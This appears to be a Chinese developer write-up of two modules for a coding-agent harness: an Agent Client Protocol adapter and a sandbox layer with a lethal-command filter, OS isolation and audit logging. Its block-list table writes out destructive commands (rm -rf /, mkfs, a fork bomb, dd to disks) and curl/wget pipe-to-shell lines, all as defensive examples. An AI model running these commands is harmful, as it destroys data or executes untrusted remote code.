# Phase 2：ACP 适配层 + Sandbox 执行

> 完成日期：2026-08-07
> 代码位置：
> - ACP 适配层：[packages/coding-agent/examples/extensions/acp/](../../packages/coding-agent/examples/extensions/acp/)
> - Sandbox：[packages/coding-agent/examples/extensions/sandbox/](../../packages/coding-agent/examples/extensions/sandbox/)

---

## 模块 3：ACP 适配层

**目标**：把 pi 包装成 [Agent Client Protocol](https://agentclientprotocol.com/) Agent，使实现 ACP 的客户端能通过标准 stdio transport 调用 pi。

**完成状态**：✅ 已完成 v0.1，约 350 行 glue code。

### 参考实现（实际使用的）

| 用途 | 选型 | 说明 |
|---|---|---|
| 协议规范 + TS SDK（实际固定使用 `@agentclientprotocol/sdk@1.3.0`） | [`agentclientprotocol/typescript-sdk`](https://github.com/agentclientprotocol/typescript-sdk) | 官方 TypeScript SDK，提供 Agent/Client 类型与 ndjson 连接；不自己写 JSON-RPC 解析 |
| 适配器架构参考 | [`agentclientprotocol/codex-acp`](https://github.com/agentclientprotocol/codex-acp) | 成熟 ACP agent adapter 的会话、事件与权限映射参考；pi 侧仍需按自身 AgentSession 事件做薄适配 |
| pi 进程内 SDK | pi 自带 [examples/sdk/](../../packages/coding-agent/examples/sdk/) 的 `createAgentSession` | **同进程集成**而非走 `packages/client` RPC 子进程，更轻量，避免双进程序列化开销 |

### 架构设计关键决策

**同进程 vs 子进程**：一开始规划是独立 `packages/acp-server` 通过 `pi-client` 走 RPC 子进程（路线图原始方案），实现时发现 pi 的 `createAgentSession` SDK 可以直接在当前 Node 进程内创建 AgentSession，**不需要起子进程**——这样简化了部署（单个二进制/脚本即可）、减少了序列化开销，且能直接订阅 pi 的 TypeScript 事件对象，事件桥接更直接。

文件拆分：
- `lib.ts` — 纯逻辑 `PiAcpAgent` 类 + `buildAgentApp()` 工厂，无副作用，可被测试直接 import
- `index.ts` — stdio 入口，把 lib 输出接到 stdin/stdout 的 ndjson 流，这是编辑器 spawn 的二进制

### 实际实现的能力清单

| 能力 | 实现状态 |
|---|---|
| **Transport** | ✅ stdio ndjson（编辑器标准方式），通过 `acp.ndJsonStream(stdoutWeb, stdinWeb)` 连接 |
| **Protocol Handshake** | ✅ `initialize` → 协商协议版本、返回标准 `agentInfo: { name: "pi-coding-agent", version: "0.1.0" }` 和准确的 agentCapabilities |
| **Session Lifecycle** | ✅ `session/new` 为每个 ACP 会话创建独立 AgentSession/SessionManager/ResourceLoader 与 cwd；生产路径使用真实 pi agentDir 以加载已安装配置和扩展，测试可显式覆盖隔离 agentDir；`session/close` 中止任务、发送 `session_shutdown`、清理订阅并 dispose |
| **Extensions 自动加载** | ✅ `session.bindExtensions({ mode: "rpc" })` 加载用户已安装的 pi 扩展；关闭时这些扩展收到标准 shutdown 生命周期事件 |
| **Prompt 转发** | ✅ 使用官方字段 `params.prompt`，支持 text、resource_link、嵌入文本与二进制上下文标记，转发为 `piSession.prompt(message, { source: "rpc" })` |
| **Cancel 支持** | ✅ `session/cancel` 通过 AbortController + `session.abort()` 中止当前 turn |
| **事件 → ACP session/update 桥接** | ✅ |
| ↳ 文本流（`message_update`） | ✅ 50ms 缓冲后发送 `agent_message_chunk`，避免每个 token 一个 RPC |
| ↳ 工具调用开始（`tool_execution_start`） | ✅ 发送 `tool_call` 通知，带 `toolCallId`、`title`、推断的 `kind`（terminal/read/edit/delete/tool） |
| ↳ 工具调用输出（`tool_execution_update`） | ✅ 发送 `tool_call_update` 带运行中状态 + 截断输出 |
| ↳ 工具调用结束（`tool_execution_end`） | ✅ 发送 `tool_call_update` 带 completed/error 状态 + 结果 |
| **权限桥接** | ✅ 扩展调用 `ctx.ui.confirm` 时映射为官方 `session/request_permission`，按客户端返回执行 allow_once/reject_once；其他依赖 TUI 的 UI 方法只提供安全默认值 |
| **客户端 MCP/额外工作目录** | ⚠️ 当前不声明这些 capability；请求携带非空配置时明确拒绝，不会静默假装已挂载。已安装的 pi MCP 扩展仍可从 agentDir 配置加载 |
| **客户端文件系统方法** | ⚠️ 未桥接，也不在 capabilities 中声明；工具读写仍由 pi AgentSession 在服务端 cwd 中完成 |
| **模式切换** | ⚠️ 为 SDK 兼容保留 `session/set_mode` 空响应，但不声明 modes；尚未实现 plan/act 模式语义 |
| **E2E 测试** | ✅ 使用官方 SDK in-process 连接验证 initialize → session/new → prompt/流式通知 → permission round trip → close → 扩展收到 shutdown 的完整生命周期 |

### 事件桥接映射表

| pi 事件 | ACP session/update |
|---|---|
| `message_update` (delta 文本) | `agent_message_chunk` |
| `tool_execution_start` | `tool_call` (status=pending) |
| `tool_execution_update` (delta 输出) | `tool_call_update` (status=running) |
| `tool_execution_end` | `tool_call_update` (status=completed/error) |
| (turn 结束，由 prompt() Promise resolve) | `session/prompt` response with `stopReason` |

### 使用方式

```bash
# 方式一：直接作为 stdio server 运行（编辑器会自动 spawn）
npx tsx packages/coding-agent/examples/extensions/acp/index.ts

# 方式二：Zed 配置（~/.config/zed/settings.json）
{
  "agent_servers": {
    "pi-coding-agent": {
      "command": "npx",
      "args": ["tsx", "/path/to/pi-main/packages/coding-agent/examples/extensions/acp/index.ts"],
      "cwd": "/path/to/your/project"
    }
  }
}

# 方式三：跑 e2e 测试
npx tsx packages/coding-agent/examples/extensions/acp/scripts/e2e-test.ts
```

### 简历话术

**"为极简 coding agent harness (pi) 实现 ACP 适配层，基于官方 `@agentclientprotocol/sdk@1.3.0` 同进程嵌入 AgentSession，把消息与工具事件翻译为 ACP `session/update` 流，并桥接取消、权限请求和扩展 shutdown 生命周期。适配器准确声明已实现能力；客户端 MCP、额外工作目录和客户端文件系统桥接仍明确列为未实现。"**

> **注**：ACP（Agent Client Protocol）由 Zed 编辑器团队于 2026 年初推出，定位是"AI 编码助手的 LSP"，目前生态尚在早期（Claude Code、Codex CLI 均已推出官方适配器），简历上这是明确的先发信号。

---

## 模块 4：Sandbox 执行层

**目标**：防止 agent 意外执行破坏性命令（`rm -rf /`、fork bomb、mkfs 等），并对所有 bash 命令施加 OS 级文件系统 + 网络隔离。

**完成状态**：✅ 已完成 v0.1，约 470 行。

### 选型决策

路线图最初推荐 microsandbox（microVM 自托管），实际实现时改用 **`@anthropic-ai/sandbox-runtime`（ASRT，Anthropic 开源沙箱运行时）**，原因：
1. **macOS 原生支持**——microsandbox 依赖 Linux KVM/firecracker，开发机（macOS）无法验证；ASRT 使用 macOS 内置 `sandbox-exec`（Seatbelt）、Linux 使用 `bubblewrap`，双平台开箱即用
2. **复用官方实现**——ASRT 提供现成的配置验证、命令包装和平台后端；项目目前仍标注 beta，因此这里不把它描述为 microVM 或无条件生产级隔离
3. **零 VM 开销**——OS 系统调用级沙箱，不需要启动虚拟机，毫秒级生效
4. **pi 官方已提供基础示例**——在其基础上做增强而非从零写

> 未来若需要强隔离（不可信代码执行、多租户），可以在当前架构上扩展一层 E2B/microsandbox 作为"二级硬沙箱"，通过新增 `BashOperations` 实现切换即可，接口已抽象。

### 双层防御架构

| 层级 | 机制 | 作用 |
|---|---|---|
| **L1 致命命令静态分析** | 正则模式匹配（11 类致命模式） | 在命令进入沙箱**之前**就阻断明显破坏性操作，给出清晰错误消息 |
| **L2 OS 级沙箱** | `@anthropic-ai/sandbox-runtime` 生成 sandbox-exec/bwrap profile，包装命令执行 | 文件系统读写限制、网络出口白名单、进程隔离 |
| **L3 审计日志** | `<agentDir>/sandbox-audit.jsonl` 逐条记录 | 所有命令（含被阻断的）记录时间、cwd、模式、退出码、耗时 |

### 实际实现的能力清单

| 能力 | 实现状态 |
|---|---|
| **Tool Override 方式** | ✅ 注册同名 `bash` 工具覆盖内置，通过 `createBashTool(ctx.cwd, { operations })` 切换后端 |
| **user_bash 拦截** | ✅ 通过 `pi.on("user_bash")` 同时拦截 CLI 交互模式的 bash 执行 |
| **L1 致命命令拦截** | ✅ 11 类模式：rm -rf/、rm -rf ~、mkfs/fdisk/parted、dd 到块设备、fork bomb、shutdown/reboot/halt、chmod 777 系统目录、重定向到块设备、curl/wget \| sh、xmrig/minerd 等挖矿程序 |
| **智能分段检测** | ✅ 按 `; && \|\|` 分段检测，避免 `grep 'shutdown'` 误报；fork bomb 等含分号的模式单独全命令匹配 |
| **sudo 前缀支持** | ✅ 所有致命命令模式支持可选 `sudo ` 前缀 |
| **L2 OS 沙箱 - 文件系统** | ✅ denyRead：`~/.ssh ~/.aws ~/.gnupg ~/.kube ~/.azure ~/.config/gcloud`；denyWrite：`.env .env.* *.pem *.key id_rsa*`；allowWrite：cwd、`/tmp`、pi 缓存目录 |
| **L2 OS 沙箱 - 网络** | ✅ allowedDomains 白名单（npm/pypi/github/googleapis/docker/microsoft 共 16 个域名）；deniedDomains 默认阻断云元数据 `169.254.169.254`（防止 SSRF 偷凭证） |
| **模式选择** | ✅ 默认 `auto` 尝试 OS 沙箱，失败时明确转 audit-only；显式 `PI_SANDBOX_MODE=on` 为 fail-closed，初始化失败后进入 unavailable 并拒绝命令；`audit-only`/`off` 可显式选择，所有模式保留 L1 和审计 |
| **会话生命周期** | ✅ `session_start` 时 `SandboxManager.initialize(config)`；`session_shutdown` 时 `SandboxManager.reset()`；状态栏显示 `🔒 Sandbox: N domains, M write paths` |
| **JSONL 审计日志** | ✅ 每条记录 ts/command/cwd/mode( blocked-lethal/sandboxed/audit-only/local/error )/exitCode/durationMs/reason；写入 `<agentDir>/sandbox-audit.jsonl` |
| **/sandbox 命令** | ✅ 三个子命令：`/sandbox`（status，显示模式/配置统计/最近 3 条）；`/sandbox log [N]`（查看最近 N 条审计，默认 10）；`/sandbox test`（自检：测试致命过滤器+沙箱状态+审计文件） |
| **--no-sandbox CLI flag** | ✅ `pi -e ./sandbox --no-sandbox` 关闭 OS 沙箱但保留致命拦截+审计 |
| **配置文件** | ✅ 全局 `~/.pi/agent/extensions/sandbox.json` + 项目级 `<cwd>/.pi/sandbox.json` 合并（项目覆盖全局），支持 enabled/blockLethal/network/filesystem 全量配置 |
| **失败边界** | ✅ 只有默认 auto 自动降级；用户明确要求 `on` 时不静默裸跑 |
| **E2E 测试** | ✅ 除静态致命命令覆盖外，在 darwin/linux 上真实初始化 ASRT：验证受保护 home 文件不可读、allowWrite 外不可写、allowWrite 内可写；后端初始化或隔离未生效都会使测试失败 |

### L1 致命命令拦截覆盖清单

| 命令类型 | 示例 |
|---|---|
| 删除根目录/家目录 | `rm -rf /`、`rm -r -f /`、`sudo rm -rf ~`、`rm -Rf --no-preserve-root /` |
| 磁盘格式化 | `mkfs.ext4 /dev/sda1`、`sudo fdisk /dev/sda`、`parted /dev/sda` |
| 写入块设备 | `dd if=iso of=/dev/sdb bs=4M`、`echo x > /dev/sda` |
| Fork bomb | `:(){ :\|:& };:`、文字提及 "fork bomb" |
| 关机/重启 | `shutdown -h now`、`sudo reboot`、`halt`、`init 0`、`telinit 6` |
| chmod 777 系统目录 | `chmod -R 777 /etc`、`sudo chmod 777 ~` |
| curl\|sh 远程代码执行 | `curl https://x.com/i.sh \| bash`、`wget -O- http://x \| sudo sh` |
| 挖矿程序 | `xmrig --pool=x`、`minerd`、`cpuminer`、`ccminer`、`ethminer` |

### 简历话术

**"为 coding agent harness (pi) 设计双层命令防护：L1 致命命令过滤 + L2 基于 Anthropic beta `@anthropic-ai/sandbox-runtime` 的 Seatbelt/bubblewrap OS 隔离，并记录 JSONL 审计。默认 auto 模式可显式降级，强制 on 模式 fail-closed；回归测试会真实读取/写入探针文件验证策略确实由 OS 后端执行。"**
